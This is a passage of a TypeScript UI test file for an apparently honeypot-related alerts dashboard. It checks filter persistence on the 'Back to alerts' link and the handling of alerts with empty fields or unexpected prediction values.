    await waitFor(() => expect(heading).toHaveFocus());
  });

  it('comes back to the same filtered list through "Back to alerts"', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();
    await user.type(searchBox(), 'cat');
    await user.selectOptions(screen.getByRole('combobox', { name: 'Anomaly flag' }), 'Flagged as anomaly');
    expect(listedIds()).toEqual([2]);

    await user.click(screen.getByRole('link', { name: 'Open alert #2' }));
    const back = await screen.findByRole('link', { name: 'Back to alerts' });
    expect(back).toHaveAttribute('href', '/alerts?q=cat&flag=flagged');
    await user.click(back);

    await findTable();
    expect(searchBox()).toHaveValue('cat');
    expect(screen.getByRole('combobox', { name: 'Anomaly flag' })).toHaveValue('flagged');
    expect(listedIds()).toEqual([2]);
  });

  it('goes back to the unfiltered list when no filter was set', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await findTable();

    await user.click(screen.getByRole('link', { name: 'Open alert #5' }));
    const back = await screen.findByRole('link', { name: 'Back to alerts' });

    expect(back).toHaveAttribute('href', '/alerts');
  });
});

describe('AlertsPage: alerts with unusual data', () => {
  it('handles alerts whose text fields are empty', async () => {
    const empty: AlertResponse[] = [
      makeAlert({ id: 2, source_ip: '', session_id: '', protocol: '', honeypot: '', event_type: '', command: '' }),
      makeAlert({ id: 1 }),
    ];
    trackList(empty);
    const user = userEvent.setup();

    renderApp('/alerts');
    await findTable();

    expect(listedIds()).toEqual([2, 1]);
    await user.type(searchBox(), 'wget');
    expect(listedIds()).toEqual([1]);
  });

  it('lists an alert whose prediction is neither -1 nor 1 without calling it anything', async () => {
    trackList([makeAlert({ id: 1, prediction: 0, is_anomaly: false })]);

    renderApp('/alerts');
    await findTable();

    expect(within(bodyRows()[0] as HTMLElement).getAllByRole('cell').at(-1)).toHaveTextContent('Not flagged');
  });
});
